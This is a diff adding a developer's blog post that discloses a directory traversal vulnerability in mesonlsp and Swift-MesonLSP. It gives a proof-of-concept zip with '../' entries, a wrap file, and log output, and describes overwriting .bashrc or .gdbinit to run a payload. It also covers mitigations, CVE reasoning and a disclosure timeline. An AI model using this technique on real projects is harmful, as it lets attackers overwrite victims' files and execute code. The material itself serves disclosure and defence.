@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+        crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"
+        integrity="sha512-hasIneQUHlh06VNBe7f6ZcHmeRTLIaQWFd43YriJ0UND19bvYRauxthDg8E4eVNPm9bRUhr5JGeqH7FRFXQu5g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"
+        integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vala.min.js"
+        integrity="sha512-DylOITkvKb7B4vEyS5WojDYRY42DYYxGMHTPnL8wTnKb+aiPK2Ghc0z9s4er/K35jTrHEmv/+wbVYHiNVcYq6g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <title>
+        The first mesonlsp vulnerability
+    </title>
+    <style>
+        body {
+            counter-reset: section;
+        }
+
+        h2 {
+            counter-reset: subsection;
+        }
+
+        h2::before {
+            counter-increment: section;
+            content: counter(section) ". ";
+        }
+
+        h3::before {
+            counter-increment: subsection;
+            content: counter(section) "." counter(subsection) ". ";
+        }
+
+        blockquote::before {
+            content: open-quote;
+        }
+
+        blockquote::after {
+            content: close-quote;
+        }
+    </style>
+</head>
+
+<body data-bs-spy="scroll" data-bs-target="#scrollspy-list" data-bs-offset="0">
+    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#">JCWasmx86's blog</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link" aria-current="page" href="/">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/all.html">All Blogposts</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/tags.html">List of Tags</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-5">
+        <div class="row">
+            
+            <div class="col-2" style="position: sticky; top: 0; height: 100%;">
+            <div id="scrollspy-list" class="list-group"><a class="list-group-item list-group-item-action" href="#list-item-0"><b>The first mesonlsp vulnerability</b></a><a class="list-group-item list-group-item-action" href="#list-item-1">Introduction</a><a class="list-group-item list-group-item-action" href="#list-item-2">PoC</a><a class="list-group-item list-group-item-action" href="#list-item-3">Effects</a><a class="list-group-item list-group-item-action" href="#list-item-4">Mitigations</a><a class="list-group-item list-group-item-action" href="#list-item-5">Why request a CVE?</a><a class="list-group-item list-group-item-action" href="#list-item-6">Timeline</a><a class="list-group-item list-group-item-action" href="#list-item-7">Links</a></div></div>
+            
+            <div class="col-8" style="position: relative; overflow-y: scroll;">
+                 <a href="/tag/mesonlsp.html">
+            <span class="badge rounded-pill bg-secondary me-1">mesonlsp</span>
+        </a> <a href="/tag/IT-Security.html">
+            <span class="badge rounded-pill bg-secondary me-1">IT-Security</span>
+        </a><br/>
+                <div data-bs-spy="scroll" data-bs-target="#scrollspy-list" data-bs-smooth-scroll="true" class="scrollspy-example" tabindex="0" style="overflow-y: scroll;"><h1 id="list-item-0">The first mesonlsp vulnerability</h1>
+<h2 id="list-item-1">Introduction</h2>
+<p>Just a few days ago, <a href="https://jcwasmx86.github.io/2024/MesonLSPSecurity.html">I analyzed how <code>mesonlsp</code> could be attacked</a>. As stated in the analysis:</p><figure class="text-end"><blockquote class="blockquote"><p><p>So if an attacker is capable of creating a crafted archive that allows overwriting files (using directory traversal due to bugs in my code) or triggers and exploits undefined behavior arbitrary code execution is possible.</p></p></blockquote></figure><p>And after I experimented a bit around, whether I could trigger any bug, I was able to find a directory traversal vulnerability.
+This vulnerability allows an attacker to overwrite files with write permissions, potentially leading to arbitrary code execution. Later, I will discuss why I decided to request a CVE.</p><p><b>Every version of <code>mesonlsp</code> and <code>Swift-MesonLSP</code> is vulnerable. Please update to 4.1.8 immediately. Update your vscode-meson version to obtain the most recent version.</b></p><h2 id="list-item-2">PoC</h2>
+<p>First we need a zip file containing entries with <code>..</code> (Output from <code>unzip -l</code>):</p><pre><code>Archive:  my_zip_file.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        8  03-31-2024 17:43   ../../../../tmp/test.txt
+        5  03-31-2024 17:47   ../../../../../../../../../../tmp/test.txt
+---------                     -------
+       13                     2 files
+</code></pre><p>This is the example zip file I use. If extracted from a (nearly) arbitrary place, it will create or overwrite <code>/tmp/test.txt</code>. The next step is to create a meson project. We can create it with <code>meson init</code> and then we have to create
+a wrap file in <code>subprojects/</code>. Let's call it <code>test.wrap</code>:</p><pre class="language-ini"><code>[wrap-file]
+source_url=http://0.0.0.0:8000/my_zip_file.zip
+source_filename=my_zip_file.zip
+source_hash=bc804e35e0935c1cee1383f808ce6276eaadbf175ee9a02c83ee0129bc9afde3
+</code></pre><p>I host the zip file on <code>localhost</code> with the python http server (<code>python -m http.server</code>). Now ensure <code>/tmp/test.txt</code> does not exist. Then we can run <code>mesonlsp --full</code>:</p><pre><code>[ INFO ] analyze::subprojectstate - ../src/libanalyze/subprojects/subprojectstate.cpp:51: test.wrap: Identifier is: ttp__0.0.0.0:8000_my_zip_file.zip 
+[ INFO ] analyze::subprojectstate - ../src/libanalyze/subprojects/subprojectstate.cpp:54: Extracting wrap to /home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip 
+[ WARN ] analyze::subprojectstate - ../src/libanalyze/subprojects/subprojectstate.cpp:66: /home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip exists, but is not fully setup =&gt; Reattempting 
+[ INFO ] analyze::subprojectstate - ../src/libanalyze/subprojects/subprojectstate.cpp:71: Installing test.wrap into /home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip 
+[ INFO ] wrap::Wrap - ../src/libwrap/wrap.cpp:29: Guessed: /home/user/a/./subprojects/test.wrap-&gt;test 
+[ INFO ] utils - ../src/libutils/utils.cpp:53: Downloading URL http://0.0.0.0:8000/my_zip_file.zip to /home/user/.cache/c++-mesonlsp/downloadCache/784e1a2172b8d8247d03ec6c1987ce35f5d4ec6ed0b7f4f321acacc2c4aea54a.cached (Temp: /tmp/9b0e9c319f264de458636635df8fabb0f40862d9ac9f85e6a29457f4deb5b966) 
+[ INFO ] utils - ../src/libutils/utils.cpp:73: curl_easy_perform: No error 200 
+[ INFO ] utils - ../src/libutils/utils.cpp:574: /home/user/.cache/c++-mesonlsp/downloadCache/784e1a2172b8d8247d03ec6c1987ce35f5d4ec6ed0b7f4f321acacc2c4aea54a.cached matches the expected hash 
+[ INFO ] utils - ../src/libutils/utils.cpp:120: Extracting /home/user/.cache/c++-mesonlsp/downloadCache/784e1a2172b8d8247d03ec6c1987ce35f5d4ec6ed0b7f4f321acacc2c4aea54a.cached to /home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip 
+[ INFO ] analyze::mesontree - ../src/libanalyze/mesontree.cpp:190: Parsing root&gt;test (/home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip/test) 
+[ WARN ] analyze::mesontree - ../src/libanalyze/mesontree.cpp:198: No meson.build file in /home/user/.cache/c++-mesonlsp/wrapsWorkspace/test.wrap/ttp__0.0.0.0:8000_my_zip_file.zip/test 
+[ INFO ] analyze::mesontree - ../src/libanalyze/mesontree.cpp:190: Parsing root (/home/user/a/.) 
+[ INFO ] analyze::mesontree - ../src/libanalyze/mesontree.cpp:121: Using custom parser for /home/user/a/./meson.build
+</code></pre><p>As you can see the archive was successfully extracted. <code>/tmp/test.txt</code> exists now.</p><h2 id="list-item-3">Effects</h2>
+<p>With this exploit, you can replace <i>any</i> file the victim has write-permissions for. What might an attack look like?</p><p>The attacker would first have to integrate such wrap-file into a project (A fork/branch is sufficient) and make the victims open the project in an editor with <code>mesonlsp</code> support (E.g. VSCode or GNOME Builder). If I were the attacker,
+I would probably replace files like <code>.bashrc</code> or <code>.gdbinit</code> to execute another payload that I could have downloaded in the malicious zip archive. While overwriting <code>.bashrc</code> may be quite visible, <code>.gdbinit</code> may not stand out immediately.
+And with that malicious payload, the attacker could do everything: From doing surprise backups in a remote location to unannounced testing of your backup strategy.</p><p>Additionally, more targeted attacks could be executed: A lot of people publish their dotfiles, so you could use a copy of their <code>.bashrc</code> file, insert malicious code and make them open the project. It would preserve basically everything: PS1,
+aliases, env variables etc. This would make detection quite difficult and as soon as it's detected - it's too late.</p><h2 id="list-item-4">Mitigations</h2>
+<p>Release 4.1.4 has a fix, but if you can't upgrade for any reason, there are a few steps you can take:</p><ul><li><p>Never run <code>mesonlsp --full</code> on an untrusted project.</p></li><li><p>Never open an untrusted project in your editor while <code>mesonlsp</code> is enabled and <code>others.neverDownloadAutomatically</code> is set to <code>false</code>.</p></li></ul><h2 id="list-item-5">Why request a CVE?</h2>
+<p>I could have simply pushed a patch, declared it an "important fix" or something like that and then just swept it under the rug. I probably would have done it like that, if I had less than a dozen users and if it were basically alpha software. But this is not the case here. Let's look at the raw stats: The most recent, widely distributed <code>Swift-MesonLSP</code> version has these download numbers (Obtained with <a href="https://github.com/mmilidoni/github-downloads-count">github-downloads-count</a>):</p><p><img src="img/Vuln/numbers.png" alt="Download counts">
+<img src="img/Vuln/osdistribution.png" alt="Chart"></p><p>In total, there have been approximately 9800 downloads. While not every download corresponds to a unique user, it is safe to assume that the user count exceeds 9000. But the number of users is probably more than 9000. Not in this statistic are users from the AUR and COPR; I don't have any good statistics for those. Sure less than 10k
+users is basically nothing in the grand scheme of things, but it's a lot for me.</p><p>As soon as an user executes my code on their some kind of unwritten, morally but not legally binding unilateral contract is created. It basically says "I will do as much as possible to prevent harm to the user, be it directly through bugs or indirectly with vulnerabilities. The trust from the user must be met with care and diligence.". Yes, there is a clause in the GPL that removes as much warranty and liability as legally possible, but for me distributing software is responsibility. I have a responsibility for the users,
+where probably the majority doesn't even know that my code is running on their system.</p><p>So, to come back to the CVE: with such a large user-base, it's the most responsible way to address this vulnerability. Requesting a CVE ensures that vulnerability scanners will eventually recognize the issue, prompting users who have installed <code>mesonlsp</code> or <code>Swift-MesonLSP</code> to update their systems.
+It's the strongest signal a software developer can send to their users, conveying the message: "If you don't update now, you could face serious consequences."
+If you use <code>vscode-meson</code> you are safe. If you use <code>neovim</code> or <code>mason</code>, you are safe. If you use the <a href="https://copr.fedorainfracloud.org/coprs/jcwasmx86/Swift-MesonLSP/">COPR</a>, install the package <code>mesonlsp</code> and uninstall <code>Swift-MesonLSP</code>.
+If you use the AUR package, please migrate to the <a href="https://aur.archlinux.org/packages/mesonlsp"><code>mesonlsp</code></a> package.</p><h2 id="list-item-6">Timeline</h2>
+<ul><li><p>Evening of March 31st, 2024: Discovered a vulnerability in <code>mesonlsp</code>.</p></li><li><p>Evening of March 31st, 2024: Began writing the security advisory and a patch. Special thanks to <a href="https://tristan.partin.io/">Tristan Partin</a> for reviewing it. Initially, only the C++ version was assumed to be vulnerable.</p></li><li><p>Morning of April 1st, 2024: Discovered that <code>Swift-MesonLSP</code> is also vulnerable.</p></li><li><p>Evening of April 1st, 2024: Released patches and created <code>4.1.4</code>. Unfortunately, a part of the patch (adding <code>ARCHIVE_EXTRACT_SECURE_SYMLINKS</code> to the <code>archive_write_disk_set_options</code> call) caused the CI on macOS to fail. For now, only <code>ARCHIVE_EXTRACT_SECURE_NODOTDOT</code> has been added. After resolving this, I noticed errors in the updated RPM <code>.spec</code> file that weren't caught during the code review. Additionally, macOS suddenly had a functioning <code>&lt;format&gt;</code> header, causing a few compiler errors. By the time these issues were fixed, I was at version <code>4.1.8</code>.</p></li><li><p>Evening of April 2nd, 2024: Updated my PR for the VSCode extension and contacted <a href="https://github.com/dcbaker">dcbaker</a> to disclose the vulnerability, as he's also the maintainer for vscode-meson.</p></li><li><p>Evening of April 3rd, 2024: Made the security advisory public.</p></li><li><p>Early Morning of April 10th, 2024: The vscode-meson PR was merged and a new release was published.</p></li><li><p>Morning of April 15th, 2024: I publish this blog post</p></li></ul><p>In retrospect, I believe my initial response to the vulnerability was swift. However, the time between making the advisory public and getting the vscode-meson PR merged could have been better managed, as a delay of 7 days is somewhat lengthy.</p><h2 id="list-item-7">Links</h2>
+<ul><li><p><a href="https://github.com/JCWasmx86/mesonlsp/security/advisories/GHSA-48c5-35fh-846h">Advisory</a></p></li><li><p><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></p></li><li><p><a href="https://aur.archlinux.org/packages/mesonlsp">AUR</a></p></li><li><p><a href="https://copr.fedorainfracloud.org/coprs/jcwasmx86/Swift-MesonLSP/">COPR</a></p></li></ul></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            hljs.highlightAll();
+        });
+    </script>
+</body>
+
+</html>
